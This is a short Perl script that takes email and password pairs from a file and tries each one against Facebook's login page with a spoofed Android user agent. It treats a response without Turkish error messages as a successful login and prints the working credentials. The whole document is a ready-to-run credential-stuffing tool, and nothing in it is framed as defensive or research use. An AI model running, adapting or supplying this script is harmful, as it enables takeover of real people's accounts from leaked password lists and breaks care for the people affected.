#!/usr/bin/perl

use strict;
use LWP::UserAgent;
use HTTP::Cookies;
my $fname="fbkCookies.dat";


open USERS, "users.txt" or die $!;
my $found = 0;
my $try=0;

while(my $line = <USERS>)
{
	if (-e $fname) { unlink $fname;}
	
	my @info = split(" ", $line);
	my $email=$info[0];
	my $password=$info[2];
	
	$try++;
	printf STDERR "$try-%-65s $found\n", "Trying $email:$password";
	my $user_agent = 'Mozilla/5.0 (Linux; U; Android 2.2; en-us; Ideos Build/FRF91) AppleWebKit/533.1 Mobile Safari/533.1';
	my %postLoginData=(
		     email=>$email,
		     pass=>$password,
		     persistent=>1,
		     login=>'Login'
	);
	my @header = ('Referer'=>'http://www.facebook.com', 'User-Agent'=>$user_agent);
	my $cookie_jar = HTTP::Cookies->new(file=>$fname,autosave=>1, ignore_discard=>1);
	my $browser = LWP::UserAgent->new;
	$browser->cookie_jar($cookie_jar);
	$browser->get('http://www.facebook.com/login.php',@header);
	my $response = $browser->post('https://login.facebook.com/login.php',\%postLoginData,@header);
	my $result=$response->content;

	if (($result =~ /Yanlış E-posta/) || ($result =~ /Şifreni mi unuttun/))
	{
		
	}
	else
	{
		$found++;
	 	printf STDOUT "$email:$password\n";
	 	flush STDOUT;
	}
}
